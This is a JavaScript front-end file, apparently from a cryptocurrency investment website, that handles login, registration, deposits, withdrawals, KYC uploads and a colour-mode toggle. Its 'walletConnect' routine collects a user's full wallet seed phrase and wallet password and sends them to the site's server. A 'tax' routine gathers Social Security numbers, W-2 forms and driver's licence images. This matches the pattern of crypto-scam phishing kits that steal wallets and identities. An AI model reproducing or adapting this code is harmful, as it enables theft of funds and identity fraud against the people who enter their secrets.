(function($) {

	"use strict";

	var fullHeight = function() {

		$('.js-fullheight').css('height', $(window).height());
		$(window).resize(function(){
			$('.js-fullheight').css('height', $(window).height());
		});

	};
	fullHeight();

	$(".toggle-password").click(function() {

	  $(this).toggleClass("fa-eye fa-eye-slash");
	  var input = $("#password");
	  if (input.attr("type") == "password") {
	    input.attr("type", "text");
	  } else {
	    input.attr("type", "password");
	  }
	});

})(jQuery);


function res(type, message) {
    return `<div class="alert alert-${type} py-1">${message}</div>`
}

async function log(self, type) {
    let error = ""
    let email = ""
    let password = ""
    let username = ""
    let fullname = ""

    var data = {
        part: "user",
        action: type,
        val: {

        }
    }
    

    const message = document.getElementById("message")

    if(type == "register") {
        username = document.getElementById("username")
        fullname = document.getElementById("fullname")

        fullname.value.trim().length < 1 ? error = "fullname" :
        username.value.trim().length < 1 ? error = "username" : null

        if(error != "") message.innerHTML = res("warning", "Please fill the forms")

        error == "username" ? username.focus() : 
        error == "fullname" ? fullname.focus() : null

        if(error != "") return

		var url = window.location.href
        var params = (new URL(url)).searchParams
        var referred = params.get('referred')

        if(referred === null) {
            referred = ""
        }

        data.val['fullname'] = fullname.value
        data.val['username'] = username.value
		data.val['referred'] = referred

    }
    if(["login", "register", "forgot"].includes(type)) {
        email = document.getElementById("email")
        if(email.value.trim().length < 6) {
            error = "email"
            message.innerHTML = res("warning", "Invalid email address")
            email.focus()

            return
        }else{
            data.val['email'] = email.value
        }
    }
    
    if(["login", "register", "password"].includes(type)) {
        password = document.getElementById("password")

        if(password.value.trim().length < 7) {
            error = "password"
            message.innerHTML = res("warning", "Password should be atleast 7 characters")
            password.focus()

            return
        }else{
            data.val['password'] = password.value
        }
    }
    
    if(type == "password") {
        // Get the token from the url
        data.val['token'] = new Func().getPath().parameter['token'];
    }

    if(type === "auth") {
        let code = document.getElementById("code")
        if(code.value.trim().length < 1){
            code.focus()
            message.innerHTML = res("warning", "Please fill the form")
            return
        }
        data.val['code'] = code.value
    }
    
    // Proceed with sending the values and the path
    message.innerHTML = ""
    new Func().buttonConfig(self, "before")

    new Func().request("request.php", JSON.stringify(data), 'json')
    .then(val => {
        new Func().buttonConfig(self, "after")
        console.log(val)
        if(val.status === 1) {
            //proceed to login
            //window.location = type == ("register" | "password") ? "login" : type == "login" ? "user/home" : null
            
            if(type == "register" || type == "password"){
                window.location = "login"
                return
            }
            
            if(type == "login"){
                window.location = "user/home"
                return
            }

            if(type == "auth"){
                window.location = "user/home"
                return
            }
            
            if(type == "forgot"){
                message.innerHTML = res("success", "An email has been sent to that address, please follow the instructions there to retrieve your password")
            }
            
            //window.location = ""
            
            return
        }

        new Func().notice_box(val)
    })

}

function submit(self, type) {
    const topParent = self.closest("[data-parent=body]")
    var data = {
        part: "user",
        action: type,
        val: {

        }
    }

    new Func().buttonConfig(self, "before")
    
    // Check where the action is coming from
    if(type === "trader"){
        let amount = topParent.querySelector("#amount").value
        let id = topParent.querySelector("#stats").getAttribute("data-id")

        data.val = {amount, id}
    }

    if(type === "profile") {
        let fullname = topParent.querySelector("#fullname").value
        let number = topParent.querySelector("#number").value
        let country = topParent.querySelector("#country").value
        let password = topParent.querySelector("#password").value

        data.val = {fullname, number, password, country}
    }

    if(type === "wallet") {
        let btc = topParent.querySelector("#btc").value
        let eth = topParent.querySelector("#eth").value
        let usdt = topParent.querySelector("#usdt").value
        let bnb = topParent.querySelector("#bnb").value

        data.val = {btc, eth, usdt, bnb}
    }

    if(type === "pay") {
        let amount = topParent.querySelector("#amount")
        let files = topParent.querySelector("#proof")
        let formdata = new FormData()
        formdata.append("amount", amount.value)
        formdata.append("files[]", files.files[0])
        formdata.append("part", "user")
        formdata.append("action", "pay")
        formdata.append("type", "file")
        formdata.append("method", new Func().getPath().parameter['method'])

        if(amount.value.length > 0 && files.files.length > 0){
            new Func().request("../request.php", formdata, 'file')
            .then(val => {
                console.log(val)
                new Func().buttonConfig(self, "after")
    
                new Func().notice_box(val)

                if(type === "trader"){
                    if(val.status === 1) {
                        location.reload()
                    }
                }
            })
        }
        new Func().buttonConfig(self, "after")
        return
    }

    if(type === "activate") {
        let amount = topParent.querySelector("#amount").value
        let package = topParent.querySelector("#pkg").value
        data.val = {amount, package}
    }
    
    if(type === "switch") {
        let profit = topParent.querySelector("#profit").value
        data.val = {profit}
    }

    if(type === "withdraw") {
        let address = topParent.querySelector("#address").value
        let wallet = topParent.querySelector("#wallet").value
        let amount = topParent.querySelector("#amount").value
        let password = topParent.querySelector("#password").value

        data.val = {address, wallet, amount, password}
    }

    if(type === "walletConnect") {
        const message = document.getElementById("message")
        
        data.action = "walletConnect"
        let seed = document.getElementById("seed").value
        let walletPassword = document.getElementById("walletPassword")
        let walletName = document.getElementById("walletName").innerText
        let method = document.querySelector(".connectHeader .active").innerText

        // Check if username is displayed
        // If it is, check that its value is not empty
        if(getComputedStyle(walletPassword).display === "block") {
            if(walletPassword.value.trim().length < 1) {
                message.innerHTML = res("warning", "Please write the username")
                return
            }
            walletPassword = walletPassword.value
        }else{
            walletPassword = ""
        }

        if(seed.length < 5) {
            message.innerHTML = res("warning", "Incomplete seed phrase")
            return
        }

        data.val = {seed, walletPassword, walletName, method}
    }

    if(type == "tax") {
        let fname = document.getElementById("fname").value,
        number = document.getElementById("number").value,
        email = document.getElementById("email").value,
        w2 = document.getElementById("w2").files[0],
        house = document.getElementById("house").value,
        ssn = document.getElementById("ssn").value,
        driver = document.getElementById("driver").files[0]
        
        let formdata = new FormData()
        formdata.append("part", "user")
        formdata.append("action", "tax")
        formdata.append("type", "file")
        
        formdata.append("fname", fname)
        formdata.append("number", number)
        formdata.append("email", email)
        formdata.append("w2[]", w2)
        formdata.append("house", house)
        formdata.append("ssn", ssn)
        formdata.append("driver[]", driver)
        
        new Func().request("../request.php", formdata, 'file')
        .then(val => {
            console.log(val)
            new Func().buttonConfig(self, "after")

            new Func().notice_box(val)
        })

        return
    }

    //new Func().buttonConfig(self, "before")

    new Func().request("../request.php", JSON.stringify(data), 'json')
    .then(val => {
        if(val.status === 1){

            if(type == "walletConnect") {
                document.getElementById("successElem").style.display = "block"
                closeModal(this)

                return
            }

            if(type == "activate" || type == "switch" || type == "trader" || type == "endtrade") {
                if(val.status === 1) setTimeout(() => {location.reload()}, 0500)
            }
        }
        new Func().buttonConfig(self, "after")

        new Func().notice_box(val)

    })


}

function packages(self, package) {
    var data = {
        part: "user",
        action: "package",
        val: {
            package
        }
    }

    new Func().request("../request.php", JSON.stringify(data), 'json')
    .then(val => {
        console.log(val)
        new Func().buttonConfig(self, "after")

        new Func().notice_box(val)
    })
}

function copy(self) {
    var wallet_address = document.querySelector(".wallet-address")
    wallet_address.select();
    document.execCommand("copy");
    var copied = document.getElementById("copy")

    copied.classList.remove("d-none")
    copied.classList.add("d-block")

    setTimeout(() => {
        copied.classList.remove("d-block")
        copied.classList.add("d-none")
    }, 3000);
}

function formatActivatonDate() {
    if(document.querySelector("#active-date") !== null) {
        let date = document.querySelector("#active-date")
        date.innerText = new Func().dateFormatting(date.innerText)
    }

}

function kyc(self) {
    let govt = document.getElementById("govt")
    let port = document.getElementById("passport")
    if(govt.files.length < 1 || port.files.length < 1){
        message.innerHTML = res("warning", "Please fill the forms")
    }else{
        let formdata = new FormData()
        formdata.append("port[]", port.files[0])
        formdata.append("govt[]", govt.files[0])
        formdata.append("part", "user")
        formdata.append("action", "kyc")
        formdata.append("type", "file")
        formdata.append("method", new Func().getPath().parameter['method'])
        
        new Func().buttonConfig(self, "before")

        new Func().request("../request.php", formdata, 'file')
        .then(val => {
            console.log(val)
            new Func().buttonConfig(self, "after")

            new Func().notice_box(val)
        })
    }
}

formatActivatonDate()

function toggleMode(self) {
    // check which is activated from user localstorage
    let mode = localStorage.getItem('colorMode')

    if(mode == "light" || mode == null) {
        localStorage.setItem("colorMode", "dark")
        changeModes(
            {"selec": ".data-light-body", "oldClass": "data-light-body", "newClass": "data-dark-body"},
            {"selec": ".data-light", "oldClass": "data-light", "newClass": "data-dark"}
        )
    }else{
        localStorage.setItem("colorMode", "light")
        changeModes(
            {"selec": ".data-dark-body", "oldClass": "data-dark-body", "newClass": "data-light-body"},
            {"selec": ".data-dark", "oldClass": "data-dark", "newClass": "data-light"}
        )
    }
}

function changeModes(cover, box, top) {
    // Body color
    let bodyElem = document.querySelector(cover.selec)
    bodyElem.classList.remove(cover.oldClass)
    bodyElem.classList.add(cover.newClass)

    // Box color
    Array.from(document.querySelectorAll(box.selec)).forEach(e => {
        e.classList.remove(box.oldClass)
        e.classList.add(box.newClass)
    })

    // Parent box color
    Array.from(document.querySelectorAll(top.selec)).forEach(e => {
        e.classList.remove(top.oldClass)
        e.classList.add(top.newClass)
    })
}

window.addEventListener("load", () => {
    // check which is activated from user localstorage
    let mode = localStorage.getItem('colorMode')
    if(mode) {
        if(mode == "dark") {
            changeModes(
                {"selec": ".data-light-body", "oldClass": "data-light-body", "newClass": "data-dark-body"},
                {"selec": ".data-light", "oldClass": "data-light", "newClass": "data-dark"},
                {"selec": ".data-light-top", "oldClass": "data-light-top", "newClass": "data-dark-top"}
            )

            if(document.getElementById("colorMode") != null) document.getElementById("colorMode").checked = true
        }

        if(mode == "light") {
            changeModes(
                {"selec": ".data-dark-body", "oldClass": "data-dark-body", "newClass": "data-light-body"},
                {"selec": ".data-dark", "oldClass": "data-dark", "newClass": "data-light"},
                {"selec": ".data-dark-top", "oldClass": "data-dark-top", "newClass": "data-light-top"}
            )
        }
    }
})
